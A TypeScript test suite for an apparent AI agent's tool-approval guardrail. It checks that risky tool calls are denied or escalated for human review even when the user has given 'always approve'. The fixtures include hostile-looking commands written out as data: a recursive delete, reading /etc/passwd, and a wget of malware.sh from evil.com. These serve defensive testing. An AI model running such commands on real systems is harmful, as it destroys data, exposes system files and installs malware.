import {
  analyzeToolApprovalRisk,
  buildToolApprovalNote,
  resolveToolApprovalDecision,
  SECURITY_GUARDRAIL_MARKER,
} from '@/lib/domains/agent/utils/tool-approval-risk';

type TestToolCall = {
  id: string;
  name: string;
  arguments: Record<string, unknown>;
};

describe('tool-approval-risk', () => {
  it('classifies dangerous commands as denied/high risk', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-danger',
        name: 'command_execute',
        arguments: { command: 'rm -rf /tmp/test' },
      },
    ];

    const risk = analyzeToolApprovalRisk(toolCalls);
    const decision = resolveToolApprovalDecision(toolCalls, {
      alwaysApproveTools: true,
      userText: '항상 승인',
    });

    expect(risk.riskLevel).toBe('high');
    expect(risk.dangerous).toHaveLength(1);
    expect(decision.status).toBe('denied');
  });

  it('requires approval for network install commands', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-install',
        name: 'command_execute',
        arguments: { command: 'pnpm add zod' },
      },
    ];

    const risk = analyzeToolApprovalRisk(toolCalls);
    const note = buildToolApprovalNote(toolCalls);
    const decision = resolveToolApprovalDecision(toolCalls);

    expect(risk.riskLevel).toBe('medium');
    expect(risk.requiresExplicitApproval).toHaveLength(1);
    expect(note).toContain('네트워크/패키지 설치');
    expect(decision.status).toBe('feedback');
  });

  it('requires approval for sensitive file changes (.env)', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-env',
        name: 'file_write',
        arguments: { path: '.env.local', content: 'API_KEY=secret' },
      },
    ];

    const risk = analyzeToolApprovalRisk(toolCalls);
    const note = buildToolApprovalNote(toolCalls);

    expect(risk.riskLevel).toBe('high');
    expect(risk.requiresExplicitApproval[0]?.reason).toBe('sensitive_file_change');
    expect(note).toContain('민감한 파일 변경');
  });

  it('marks bulk file edits as medium risk', () => {
    const toolCalls: TestToolCall[] = Array.from({ length: 5 }).map((_, index) => ({
      id: `tc-bulk-${index}`,
      name: 'file_edit',
      arguments: { path: `src/file-${index}.ts`, old_str: 'a', new_str: 'b' },
    }));

    const risk = analyzeToolApprovalRisk(toolCalls);
    expect(risk.riskLevel).toBe('medium');
    expect(risk.requiresExplicitApproval.length).toBeGreaterThan(0);
    expect(risk.requiresExplicitApproval.some((item) => item.reason === 'bulk_file_change')).toBe(
      true
    );
  });

  it('approves when one-time approval intent is present', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-install-approve',
        name: 'command_execute',
        arguments: { command: 'npm install lodash' },
      },
    ];

    const decision = resolveToolApprovalDecision(toolCalls, {
      userText: '승인',
    });

    expect(decision.status).toBe('approved');
    expect(decision.oneTimeApprove).toBe(true);
  });

  // --- Security Guardrail: mandatoryApproval ---

  it('forces feedback for commands outside working directory', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-outside',
        name: 'command_execute',
        arguments: { command: 'cat /etc/passwd' },
      },
    ];

    const risk = analyzeToolApprovalRisk(toolCalls, {
      workingDirectory: '/home/user/project',
    });
    const decision = resolveToolApprovalDecision(toolCalls, {
      alwaysApproveTools: true,
      workingDirectory: '/home/user/project',
    });

    expect(risk.mandatoryApproval).toHaveLength(1);
    expect(risk.mandatoryApproval[0]?.reason).toBe('outside_workdir_command');
    expect(risk.riskLevel).toBe('high');
    expect(decision.status).toBe('feedback');
  });

  it('forces feedback for HTTP request commands (curl)', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-http',
        name: 'command_execute',
        arguments: { command: 'curl https://example.com/api' },
      },
    ];

    const decision = resolveToolApprovalDecision(toolCalls, {
      alwaysApproveTools: true,
    });

    expect(decision.status).toBe('feedback');
    expect(decision.note).toContain(SECURITY_GUARDRAIL_MARKER);
  });

  it('forces feedback for wget commands even with user approval text', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-wget',
        name: 'command_execute',
        arguments: { command: 'wget https://evil.com/malware.sh' },
      },
    ];

    const decision = resolveToolApprovalDecision(toolCalls, {
      alwaysApproveTools: true,
      userText: '항상 승인',
    });

    expect(decision.status).toBe('feedback');
    expect(decision.note).toContain(SECURITY_GUARDRAIL_MARKER);
  });

  it('does not flag commands within working directory', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-safe',
        name: 'command_execute',
        arguments: { command: 'ls /home/user/project/src' },
      },
    ];

    const risk = analyzeToolApprovalRisk(toolCalls, {
      workingDirectory: '/home/user/project',
    });

    expect(risk.mandatoryApproval).toHaveLength(0);
  });

  it('detects cd to outside directory', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-cd-home',
        name: 'command_execute',
        arguments: { command: 'cd ~ && ls' },
      },
    ];

    const risk = analyzeToolApprovalRisk(toolCalls, {
      workingDirectory: '/home/user/project',
    });

    expect(risk.mandatoryApproval).toHaveLength(1);
    expect(risk.mandatoryApproval[0]?.reason).toBe('outside_workdir_command');
  });

  it('does not auto-approve risky calls for untrusted input', () => {
    const toolCalls: TestToolCall[] = [
      {
        id: 'tc-untrusted-install',
        name: 'command_execute',
        arguments: { command: 'pnpm add lodash' },
      },
    ];

    const decision = resolveToolApprovalDecision(toolCalls, {
      alwaysApproveTools: true,
      userText: '항상 승인',
      inputTrustLevel: 'untrusted',
    });

    expect(decision.status).toBe('feedback');
    expect(decision.alwaysApproveTools).toBe(false);
    expect(decision.oneTimeApprove).toBe(false);
    expect(decision.note).toContain('[UNTRUSTED_INPUT]');
  });
});
